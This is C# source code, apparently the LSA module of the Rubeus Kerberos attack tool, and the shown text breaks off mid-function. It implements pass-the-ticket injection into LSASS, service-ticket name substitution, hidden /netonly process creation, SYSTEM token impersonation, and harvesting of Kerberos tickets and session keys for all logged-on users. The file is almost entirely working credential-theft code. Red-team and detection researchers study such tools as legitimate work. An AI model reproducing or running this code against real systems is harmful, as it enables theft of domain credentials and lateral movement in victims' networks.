using Asn1;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security;
using System.Reflection;
using System.Security.AccessControl;
using Microsoft.Win32;
using ConsoleTables;
using System.Security.Principal;

namespace Rubeus
{
    public class LSA
    {
        public static IntPtr LsaRegisterLogonProcessHelper()
        {
            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
            //  used for Kerberos ticket enumeration

            string logonProcessName = "User32LogonProcesss";
            Interop.LSA_STRING_IN LSAString;
            IntPtr lsaHandle = IntPtr.Zero;
            UInt64 securityMode = 0;

            LSAString.Length = (ushort)logonProcessName.Length;
            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
            LSAString.Buffer = logonProcessName;

            int ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);

            return lsaHandle;
        }

        public static Interop.LUID CreateProcessNetOnly(string commandLine, bool show = false)
        {
            // creates a hidden process with random /netonly credentials,
            //  displayng the process ID and LUID, and returning the LUID

            // Note: the LUID can be used with the "ptt" action

            Console.WriteLine("\r\n[*] Action: Create Process (/netonly)\r\n");

            Interop.PROCESS_INFORMATION pi;
            Interop.STARTUPINFO si = new Interop.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (!show)
            {
                // hide the window
                si.wShowWindow = 0;
                si.dwFlags = 0x00000001;
            }
            Console.WriteLine("[*] Showing process : {0}", show);
            Interop.LUID luid = new Interop.LUID();

            // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
            if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi))
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
                return new Interop.LUID();
            }

            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);

            IntPtr hToken = IntPtr.Zero;
            // TOKEN_QUERY == 0x0008
            bool success = Interop.OpenProcessToken(pi.hProcess, 0x0008, out hToken);
            if (!success)
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
                return new Interop.LUID();
            }

            int TokenInfLength = 0;
            bool Result;

            // first call gets lenght of TokenInformation to get proper struct size
            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

            // second call actually gets the information
            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);

            if (Result)
            {
                Interop.TOKEN_STATISTICS TokenStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
                luid = new Interop.LUID(TokenStats.AuthenticationId);
                Console.WriteLine("[+] LUID            : {0}", luid);
            }
            else
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
                Marshal.FreeHGlobal(TokenInformation);
                Interop.CloseHandle(hToken);
                return new Interop.LUID();
            }

            Marshal.FreeHGlobal(TokenInformation);
            Interop.CloseHandle(hToken);

            return luid;
        }

        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, Interop.LUID luid = new Interop.LUID())
        {
            // subtitutes in an alternate servicename (sname) into a supplied service ticket

            Console.WriteLine("\r\n[*] Action: Service Ticket sname Substitution\r\n");

            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);

            List<string> name_string = new List<string>();
            string[] parts = altsname.Split('/');
            if (parts.Length == 1)
            {
                // sname alone
                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
            }
            else if (parts.Length == 2)
            {
                name_string.Add(parts[0]);
                name_string.Add(parts[1]);

                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
            }

            byte[] kirbiBytes = kirbi.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

            // display the .kirbi base64, columns of 80 chararacters
            foreach (string line in Helpers.Split(kirbiString, 80))
            {
                Console.WriteLine("      {0}", line);
            }

            DisplayTicket(kirbi, false);

            if (ptt || ((ulong)luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }
        }

        public static void ImportTicket(byte[] ticket, Interop.LUID targetLuid)
        {
            Console.WriteLine("\r\n[*] Action: Import Ticket");

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if((ulong)targetLuid != 0)
            {
                if(!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
                else
                {
                    string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void Purge(Interop.LUID targetLuid)
        {
            Console.WriteLine("\r\n[*] Action: Purge Tickets");

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }
                else
                {
                    string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }

                Interop.KERB_PURGE_TKT_CACHE_REQUEST request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if ((ulong)targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    string errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Tickets successfully purged!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void ListKerberosTicketData(Interop.LUID targetLuid, string targetService = "", bool monitor = false, string registryBasePath = null)
        {
            if (Helpers.IsHighIntegrity())
            {
                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor, false, registryBasePath);
            }
            else
            {
                if (registryBasePath != null)
                {
                    Console.WriteLine("[X] Registry option was passed but will not be used, as we require elevated rights to write to HKLM.");
                }
                ListKerberosTicketDataCurrentUser(targetService);
            }
        }

        public static void ListKerberosTickets(Interop.LUID targetLuid)
        {
            if (Helpers.IsHighIntegrity())
            {
                ListKerberosTicketsAllUsers(targetLuid);
            }
            else
            {
                ListKerberosTicketsCurrentUser();
            }
        }

        public static void ListKerberosTicketDataAllUsers(Interop.LUID targetLuid, string targetService = "", bool monitor = false, bool harvest = false, string registryBasePath = null)
        {
            // extracts Kerberos ticket data for all users on the system (assuming elevation)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Microsoft.Win32.RegistryKey baseKey = null;
            Microsoft.Win32.RegistryKey userData = null;
            string user = null;
            if (!monitor)
            {
                Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
            }
            else
            {
                if (Environment.UserName == "SYSTEM")
                {
                    user = "NT AUTHORITY\\SYSTEM";
                }
                else
                {
                    user = Environment.UserDomainName + "\\" + Environment.UserName;
                };
                if (registryBasePath != null)
                {
                    try
                    {
                        Registry.LocalMachine.CreateSubKey(registryBasePath);
                        baseKey = Registry.LocalMachine.OpenSubKey(registryBasePath, RegistryKeyPermissionCheck.ReadWriteSubTree);
                        RegistrySecurity rs = baseKey.GetAccessControl();
                        RegistryAccessRule rar = new RegistryAccessRule(
                            user,
                            RegistryRights.FullControl,
                            InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                            PropagationFlags.None,
                            AccessControlType.Allow);
                        rs.AddAccessRule(rar);
                        baseKey.SetAccessControl(rs);
                    }
                    catch
                    {
                        Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", registryBasePath);
                        baseKey = null;
                    }
                }
            }

            if ((ulong)targetLuid != 0)
            {
                Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
            }
            if (!String.IsNullOrEmpty(targetService))
            {
                Console.WriteLine("[*] Target service  : {0:x}", targetService);
                if (!monitor)
                {
                    Console.WriteLine();
                }
            }

            int totalTicketCount = 0;
            int extractedTicketCount = 0;
            int retCode;
            int authPack;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                        int returnBufferLength = 0;
                        int protocalStatus = 0;

                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                        Interop.KERB_TICKET_CACHE_INFO ticket;

                        // input object for querying the ticket cache for a specific logon ID
                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                        tQuery.LogonId = userLogonID;

                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                        {
                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                            // query LSA, specifying we want the ticket cache
                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                            if (ticketsPointer != IntPtr.Zero)
                            {
                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                int count2 = tickets.CountOfTickets;

                                if (count2 != 0)
                                {
                                    if (baseKey != null)
                                    {
                                        baseKey.CreateSubKey(username + "@" + domain);
                                        userData = baseKey.OpenSubKey(username + "@" + domain, RegistryKeyPermissionCheck.ReadWriteSubTree);
                                        userData.SetValue("Username", username);
                                        userData.SetValue("Domain", domain);
                                        userData.SetValue("LoginId", data.LoginID.LowPart.ToString());
                                        userData.SetValue("UserSID", sid.Value.ToString());
                                        userData.SetValue("AuthenticationPackage", authpackage.ToString());
                                        userData.SetValue("LogonType", logonType.ToString());
                                        userData.SetValue("LogonTime", logonTime.ToString());
                                        userData.SetValue("LogonServer", logonServer.ToString());
                                        userData.SetValue("LogonServerDNSDomain", dnsDomainName.ToString());
                                        userData.SetValue("UserPrincipalName", upn.ToString());
                                    }

                                    Console.WriteLine("\r\n  UserName                 : {0}", username);
                                    Console.WriteLine("  Domain                   : {0}", domain);
                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID);
                                    Console.WriteLine("  UserSID                  : {0}", sid.Value);
                                    Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                                    Console.WriteLine("  LogonType                : {0}", logonType);
                                    Console.WriteLine("  LogonTime                : {0}", logonTime);
                                    Console.WriteLine("  LogonServer              : {0}", logonServer);
                                    Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                                    Console.WriteLine("  UserPrincipalName        : {0}", upn);
                                    Console.WriteLine();
                                    if (!monitor)
                                    {
                                        Console.WriteLine("    [*] Enumerated {0} ticket(s):\r\n", count2);
                                    }
                                    totalTicketCount += count2;

                                    // get the size of the structures we're iterating over
                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                    for (int j = 0; j < count2; j++)
                                    {
                                        // iterate through the result structures
                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                        // parse the new ptr to the appropriate structure
                                        ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        // extract the serverName and ticket flags
                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                                        if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                                        {
                                            extractedTicketCount++;

                                            // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                            IntPtr responsePointer = IntPtr.Zero;
                                            Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                                            Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                            // signal that we want encoded .kirbi's returned
                                            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

                                            // the specific logon session ID
                                            request.LogonId = userLogonID;

                                            request.TicketFlags = ticket.TicketFlags;
                                            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                            request.EncryptionType = 0x0;
                                            // the target ticket name we want the ticket for
                                            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                            request.TargetName = tName;

                                            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                            //      for KerbRetrieveEncodedTicketMessages

                                            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                            int newStructSize = structSize + tName.MaximumLength;
                                            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                            // marshal the struct from a managed object to an unmanaged block of memory.
                                            Marshal.StructureToPtr(request, unmanagedAddr, false);

                                            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                                            // copy unicode chars to the new location
                                            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                                            // update the target name buffer ptr
                                            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size==8?24:16, newTargetNameBuffPtr);

                                            // actually get the data
                                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                                            // translate the LSA error (if any) to a Windows error
                                            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                                            {
                                                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                string serviceName = "";
                                                if (response.Ticket.ServiceName != IntPtr.Zero)
                                                {
                                                    Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    if (serviceNameStruct.NameCount == 1)
                                                    {
                                                        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                                        serviceName = serviceNameStr1;
                                                    }
                                                    else if (serviceNameStruct.NameCount == 2)
                                                    {
                                                        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                                        string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                                        serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
                                                    }
                                                    else if (serviceNameStruct.NameCount == 3)
                                                    {
                                                        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                                        string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                                        string serviceNameStr3 = Marshal.PtrToStringUni(serviceNameStruct.Names[2].Buffer, serviceNameStruct.Names[2].Length / 2).Trim();
                                                        serviceName = String.Format("{0}/{1}/{2}", serviceNameStr1, serviceNameStr2, serviceNameStr3);
                                                    }
                                                    else { }
                                                }


                                                string targetName = "";
                                                if (response.Ticket.TargetName != IntPtr.Zero)
                                                {
                                                    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    if (targetNameStruct.NameCount == 1)
                                                    {
                                                        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                                        targetName = targetNameStr1;
                                                    }
                                                    else if (targetNameStruct.NameCount == 2)
                                                    {
                                                        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                                        string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                                        targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
                                                    }
                                                    else if (targetNameStruct.NameCount == 3)
                                                    {
                                                        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                                        string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                                        string targetNameStr3 = Marshal.PtrToStringUni(targetNameStruct.Names[2].Buffer, targetNameStruct.Names[2].Length / 2).Trim();
                                                        targetName = String.Format("{0}/{1}/{2}", targetNameStr1, targetNameStr2, targetNameStr3);
                                                    }
                                                    else { }
                                                }


                                                string clientName = "";
                                                if (response.Ticket.ClientName != IntPtr.Zero)
                                                {
                                                    Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    if (clientNameStruct.NameCount == 1)
                                                    {
                                                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                                        clientName = clientNameStr1;
                                                    }
                                                    else if (clientNameStruct.NameCount == 2)
                                                    {
                                                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                                        string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
                                                        clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
                                                    }
                                                    else { }
                                                }


                                                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                                                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                                                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                                                // extract the session key
                                                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                                                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                                                byte[] sessionKey = new byte[sessionKeyLength];
                                                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                                                string base64SessionKey = Convert.ToBase64String(sessionKey);

                                                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                                                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
